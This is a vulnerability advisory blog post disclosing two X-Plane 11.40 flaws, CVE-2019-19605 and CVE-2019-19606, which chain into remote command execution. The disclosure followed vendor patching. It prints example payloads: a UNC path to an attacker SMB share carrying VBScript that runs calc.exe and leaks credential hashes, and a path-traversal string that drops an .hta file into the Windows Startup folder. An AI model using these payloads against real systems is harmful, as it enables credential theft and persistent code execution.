=== Content from blog.0xlabs.com_27ac363e_20250120_235230.html ===


[![0xlabs | Blog](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjD9bbOEmcZWSAN6h1_a5fTz5BiO2EMVjo68AaN5pudEDqNIgsRnPxhPSFIdZqxfr2i3gHxv7kcwssyylb-L9IPGJkoPxac0Tvc1sG-nMv2Kct-gl0Ar76Thihi79SyXhtn2fazZMzCyI8/s1600/Sin-t%25C3%25ADtulo-3.png)](https://blog.0xlabs.com/)

## 2020/03/28

### X-Plane < 11.41 Remote Command Execution

**BACKGROUND**
X-Plane is a flight simulator produced by Laminar Research. X-Plane can be used professionally with the correct license, or used personally.

**DESCRIPTION**

X-Plane <= 11.40 is affected by two vulnerabilities that may allow
remote users to execute arbitrary commands on systems running the simulator. Some networking interface commands, needed to interact with 3rd party apps, are not properly sanitized which allows memory corruption and path traversal/arbitrary file write. The affected interface is enabled by default and listens on port 49000 UDP. The protocol documentation is public. These vulnerabilities could be chained to execute arbitrary system commands.

**PROOF OF CONCEPT**

**1.** **CVE-2019-19605 - Arbitrary Memory Write via crafted network packets, which could cause a denial of service or arbitrary code execution.**

* **Command affected: ACFN**
* **Parameter affected: acfn\_p**

- The affected parameter is used as array index without range checks, allowing controlled out of bounds memory write.

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgt1D6mAbmX3t_m9BjDx0k035jY4CCMEsiVyG7Ky2ssFsThGe4Hhy-dWm3UIyPNB0BwqDMeaiXegC7aguZRoTQWEnaKk4zOoy5cRJeW-a2wuDa1IkoFierKrpTDcR_h9Wc4hTC7kodCywE/s640/imagen.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgt1D6mAbmX3t_m9BjDx0k035jY4CCMEsiVyG7Ky2ssFsThGe4Hhy-dWm3UIyPNB0BwqDMeaiXegC7aguZRoTQWEnaKk4zOoy5cRJeW-a2wuDa1IkoFierKrpTDcR_h9Wc4hTC7kodCywE/s1600/imagen.png)
[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjWw1doauxFv2fPuS9FveReJ0JfAXtRcEtlIkkcshsyBkAEP7vetQx5wZc-geMm0Z4zDDSfAXWjihDyRNjijBCof1BrGLmOaViwwtdWcxrCs6wGJsEGimPzcfpH6rQ25mwjAOyqBh879oA/s320/unnamed.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjWw1doauxFv2fPuS9FveReJ0JfAXtRcEtlIkkcshsyBkAEP7vetQx5wZc-geMm0Z4zDDSfAXWjihDyRNjijBCof1BrGLmOaViwwtdWcxrCs6wGJsEGimPzcfpH6rQ25mwjAOyqBh879oA/s1600/unnamed.png)

**2. CVE-2019-19606 -** **Multiple improper path validations, which could allow reading and writing files from/to arbitrary paths (or leaking OS credentials to a remote system).**

* **Command affected: SIMO**
* **Parameter affected: Second parameter (SIMO\_path)**

* **Command affected: ACFN**
* **Parameter affected: Second parameter (acfn\_path\_rel)**

* **Command affected: OBJN**
* **Parameter affected: Second parameter (path)**

- Allows arbitrary file read/write outside of the X-Plane installation folder. Several commands do not filter correctly the data input.

   - It is also important to note that on Windows machines, when opening a file starting with "\\" or "//" followed by an ip or hostname, most IO APIs will try to connect to it as a SMB(445 port) shared folder by default, leaking the user domaingroup, username and hash password to the malicious server. If the port is closed and the WebClient service is running it will try to access the file via WEBDAV (port 80).

    Other commands and parameters may be affected in same way.

   The "ACFN" and "SIMO" commands can be used to leak the hashed credentials and execute arbitrary command/code on every system reboot.

* Load an aircraft from a shared folder with arbitrary VBScript code in the path, via "ACFN" command. For example:

> \\\\192.168.1.101/TMP/<script language="VBScript">CreateObject("Wscript.Shell").Run "calc.exe"</script>/final.acf

* Write a situation file with the "SIMO" command to the user's startup folder with ".hta" extension, gaining execution of VBScript code, stored as aircraft path inside the file. For example:

> test.txt/../../../../../../../../../../../../Users/<LEAKED\_USER>/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/test.hta

**VIDEO**

The next video shows a Kali virtual machine exploiting these vulnerabilities to execute commands (a calculator) on a machine running Windows 10 and X-Plane 11.40.

**SOLUTION**

Improve the parameter filtering and range checks on command parameters.

**TIMELINE**

November 5, 2019: Contact with X-Plane Team

November 5, 2019: X-Plane confirms the vulnerabilities.

December 6, 2019: X-Plane releases patched version 11.41r1

March 28, 2020: Advisory published.

**DISCOVERED BY**

Jose Antonio Pérez Piedra

en

[3/28/2020](https://blog.0xlabs.com/2020/03/x-plane-1141-remote-command-execution.html "permanent link")

[![](https://resources.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=905596332323260686&postID=4441221675092453354&from=pencil "Editar entrada")

[Enviar por correo electrónico](https://www.blogger.com/share-post.g?blogID=905596332323260686&postID=4441221675092453354&target=email "Enviar por correo electrónico")[Escribe un blog](https://www.blogger.com/share-post.g?blogID=905596332323260686&postID=4441221675092453354&target=blog "Escribe un blog")[Compartir en X](https://www.blogger.com/share-post.g?blogID=905596332323260686&postID=4441221675092453354&target=twitter "Compartir en X")[Compartir con Facebook](https://www.blogger.com/share-post.g?blogID=905596332323260686&postID=4441221675092453354&target=facebook "Compartir con Facebook")[Compartir en Pinterest](https://www.blogger.com/share-post.g?blogID=905596332323260686&postID=4441221675092453354&target=pinterest "Compartir en Pinterest")

#### No hay comentarios:

[Publicar un comentario](https://www.blogger.com/comment/fullpage/post/905596332323260686/4441221675092453354)

[Entrada más reciente](https://blog.0xlabs.com/2021/02/wavlink-rce-CVE-2020-13117.html "Entrada más reciente")

[Entrada antigua](https://blog.0xlabs.com/2018/03/openvpn-remote-information-disclosure.html "Entrada antigua")

[Inicio](https://blog.0xlabs.com/)

Suscribirse a:
[Enviar comentarios (Atom)](https://blog.0xlabs.com/feeds/4441221675092453354/comments/default)

[![siguenos en Twitter](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgqkJSwVUaQnrQQ3VT-lyaOyJp7EzxJ5L1vwaLWFdBpVDYs4psQpZkvBw0YArpstEKqLG9_1YHTXl-4Ht22kitm3l9YBvEnBjFKMsCDJZG31hJJEY49IShwHub3em5q49HNxI0pz76z1nKL/s1600/Twitter+NEW.png "siguenos en Twitter")](https://twitter.com/0xlabs)
[![Canal de youtube](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgo2F-zc7yzDhWB0VbY2zTksJI8UZHo1HH7nIl0gFYNp3PedB-MbRO_6wODiSzcDgE4zvGTqCHScrfIsTyB3HS6EpM4MT4P7uPvsgK4mH0zsynVZEbQPjxDUJwDjvj5mwOqZfeOxOh6mhbT/s1600/YouTube+alt+1.png "Canal de youtube")](https://www.youtube.com/channel/UCzoc7uM6DqveUeLU6iVvaJQ)
[![Rss feed](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgOkf49FGFJxNx-uysJtqdZjryR07AbQzZJsmrEUhcHzckjEXap8zIyjsptrRCuu2xjGYec2-2gcg97kLguTzsSlbUoHfv1DhABRiX5s1mZFcsObT1Axh4NQ6GP__gU1Lt1P8ZYqz9SSoXy/s1600/RSS+Feed.png "Rss feed")](http://blog.0xlabs.com/feeds/posts/default)
[![sígueme por Correo](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi6cAs7RSL9YolKIfUsi1gF-UyEbIe_XuptW_Be2mYl-SLwIrYG3ieD4aPsgrovxjNLnyvLMQ7j_EYIsuM79rzJ61bDJjTY9HEEDom4FnmiXYBUJT4AxDDbAYIa2CFwkB0h5yuUcSdCeO3S/s1600/Mail.png "sígueme por Correo")](https://www.0xlabs.com/contact)

## Sitios

* [Home](http://www.0xlabs.com/)
* [FileMask](http://filemask.0xlabs.com/)
* [HashMask](http://hashmask.0xlabs.com/)
* [Twitter](http://www.twitter.com/0xlabs)

## Archivo

* [febrero 2021](https://blog.0xlabs.com/2021/02/) (1)
* [marzo 2020](https://blog.0xlabs.com/2020/03/) (1)
* [marzo 2018](https://blog.0xlabs.com/2018/03/) (1)
* [marzo 2017](https://blog.0xlabs.com/2017/03/) (1)
* [marzo 2014](https://blog.0xlabs.com/2014/03/) (1)
* [mayo 2013](https://blog.0xlabs.com/2013/05/) (1)

## Etiquetas

[buffer overflow](https://blog.0xlabs.com/search/label/buffer%20overflow)

[bugtrack](https://blog.0xlabs.com/search/label/bugtrack)

[cross site](https://blog.0xlabs.com/search/label/cross%20site)

[cross site scripting](https://blog.0xlabs.com/search/label/cross%20site%20scripting)

[CVE-2020-13117](https://blog.0xlabs.com/search/label/CVE-2020-13117)

[exploit](https://blog.0xlabs.com/search/label/exploit)

[fulldisclosure](https://blog.0xlabs.com/search/label/fulldisclosure)

[information disclosure](https://blog.0xlabs.com/search/label/information%20disclosure)

[mysql](https://blog.0xlabs.com/search/label/mysql)

[paypal](https://blog.0xlabs.com/search/label/paypal)

[pchart](https://blog.0xlabs.com/search/label/pchart)

[phishing](https://blog.0xlabs.com/search/label/phishing)

[rce](https://blog.0xlabs.com/search/label/rce)

[remote root](https://blog.0xlabs.com/search/label/remote%20root)

[ssh](https://blog.0xlabs.com/search/label/ssh)

[vulnerability](https://blog.0xlabs.com/search/label/vulnerability)

[wavlink](https://blog.0xlabs.com/search/label/wavlink)

[WN575A4](https://blog.0xlabs.com/search/label/WN575A4)

[WN579X3](https://blog.0xlabs.com/search/label/WN579X3)

[xss](https://blog.0xlabs.com/search/label/xss)

[zpanel](https://blog.0xlabs.com/search/label/zpanel)

[zsudo](https://blog.0xlabs.com/search/label/zsudo)


